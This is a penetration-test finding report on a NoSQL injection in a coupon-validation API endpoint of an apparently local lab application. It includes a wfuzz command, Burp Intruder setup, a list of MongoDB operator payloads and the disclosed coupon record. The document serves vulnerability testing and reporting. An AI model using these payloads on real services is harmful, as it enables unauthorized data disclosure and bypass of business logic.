  
  
****CWE:** CWE-943 – Improper Neutralization of Special Elements in Data Query Logic  
**CVSS v3.1:** 7.1 (High)


---  
  
## Description  
  
The application is vulnerable to a NoSQL Injection attack due to insufficient validation and sanitization of user-supplied input before it is processed by backend database queries.  
  
The vulnerable endpoint accepts JSON input and fails to properly restrict special MongoDB query operators. As a result, an attacker can inject operators such as `$gt`, `$ne`, and `$nin` to manipulate database queries and retrieve unauthorized information.  
  
During testing, a crafted payload successfully bypassed the normal coupon validation logic and disclosed valid coupon information, confirming that user-controlled input is directly incorporated into backend database queries.  
  
---  
  
## Vulnerable Instance  
  
```http  
POST /community/api/v2/coupon/validate-coupon  
```

![](Attachments/Pasted%20image%2020260609200619.png)

---  
  
## Proof of Concept  
  
### Step 1 – Access the Coupon Validation Function  
  
Navigate to the **Shop** section and click **Add Coupons**.  
  
Enter an arbitrary coupon code and intercept the request using Burp Suite.  
  
**Request:**  
  
```http  
POST /community/api/v2/coupon/validate-coupon HTTP/1.1  
Host: localhost:8888  
Content-Type: application/json  
  
{  
"coupon_code": "blah"  
}  
```
![](Attachments/Pasted%20image%2020260609200642.png)



---  
  
### Step 2 – Prepare the Request for Fuzzing  
  
Send the intercepted request to **Burp Intruder** or prepare it for automated fuzzing.  
  
Replace the coupon value with a fuzzing marker:  
  
```json  
{  
"coupon_code": "FUZZ"  
}  
```

---  
  
### Step 3 – Execute NoSQL Injection Payloads  
  
Load a NoSQL payload wordlist from SecLists and use WFuzz to test the endpoint for injection vulnerabilities.  
  
**WFuzz Command:**  
  
```bash  
wfuzz \  
-z file,/usr/share/seclists/Fuzzing/Databases/NoSQL.txt \  
-H "Content-Type: application/json" \  
-H "Authorization: Bearer [JWT_TOKEN]" \  
-d "{\"coupon_code\":FUZZ}" \  
http://127.0.0.1:8888/community/api/v2/coupon/validate-coupon  
```  
  
The fuzzing results showed that most payloads returned validation errors; however, one payload generated a successful response.  
  
Successful payload:  
  
```json  
{"$gt": ""}  
```  
  
---

![](Attachments/Pasted%20image%2020260609200706.png)


---  
  
### Step 4 – Identify a Successful Injection  
  
The following payload returned an HTTP 200 OK response:  
  
```json  
{  
"coupon_code": {"$gt": ""}  
}  
```  
  
WFuzz Output:  
  
```text  
000000018: 200 1 L 1 W 79 Ch {"$gt": ""}  
```  
  
The `$gt` operator instructs MongoDB to return values greater than an empty string. Because the application fails to validate the expected data type, the operator is interpreted as part of the database query.  
  
---

### Step 6 – Validate the Finding Using Burp Intruder  
  
To further verify the vulnerability, the intercepted request was sent to **Burp Intruder**.  
  
The `coupon_code` parameter was selected as the attack position and replaced with the payload marker:  
  
```json  
{  
"coupon_code": "§FUZZ§"  
}  
```  
  
A **Sniper** attack was configured to test multiple NoSQL injection payloads against the vulnerable parameter.  
  
**Burp Intruder Configuration:**  
  
- Attack Type: Sniper  
- Payload Type: Simple List  
- Target Parameter: `coupon_code`  
- Payload Source: NoSQL Injection Payload List  
  
Example payloads:  
  
```text  
true, $where:'1 == 1'  
$where:'1 == 1'  
{ $ne: 1 }  
{ "$gt": "" }  
{ "$nin": [""] }  
```

![](Attachments/Pasted%20image%2020260609200727.png)

![](Attachments/Pasted%20image%2020260609200743.png)
![](Attachments/Pasted%20image%2020260609200804.png)


### Step 7 – Analyze Intruder Results  
  
After executing the Intruder attack, the responses were analyzed based on:  
  
- HTTP Status Codes  
- Response Length  
- Response Content Differences  
  
Most payloads returned validation errors (`HTTP 422 Unprocessable Entity`), indicating that the application rejected malformed input.  
  
However, the following payload generated a successful response:  
  
```json  
{  
"$gt": ""  
}  
```  
  
The request returned:  
  
```http  
HTTP/1.1 200 OK  
```  
  
while other payloads were rejected.
  
---
 
### Step 8 – Confirm Unauthorized Data Disclosure  
  
The successful payload caused the application to return a valid coupon record:  
  
```json  
{  
"coupon_code": "TRAC075",  
"amount": "75",  
"CreatedAt": "2026-04-24T08:18:05.808Z"  
}  
```  
  
The response demonstrates that the backend interpreted the injected MongoDB operator as part of the database query rather than treating it as user-supplied input.  
  
As a result, an attacker can bypass the intended coupon validation logic and retrieve coupon information without knowing a valid coupon code.  
  
---  
  
### Step 9 – Vulnerability Confirmation  
  
Both **WFuzz** and **Burp Intruder** successfully identified a NoSQL Injection vulnerability within the coupon validation endpoint.  
  
The application fails to properly validate and sanitize JSON input before constructing database queries, allowing MongoDB query operators such as:  
  
```text  
$gt  
$ne  
$nin  
$where  
```  
  
to influence backend query execution.  
  
The successful retrieval of coupon information confirms that attacker-controlled input is processed directly by the database layer, resulting in unauthorized information disclosure and business logic bypass.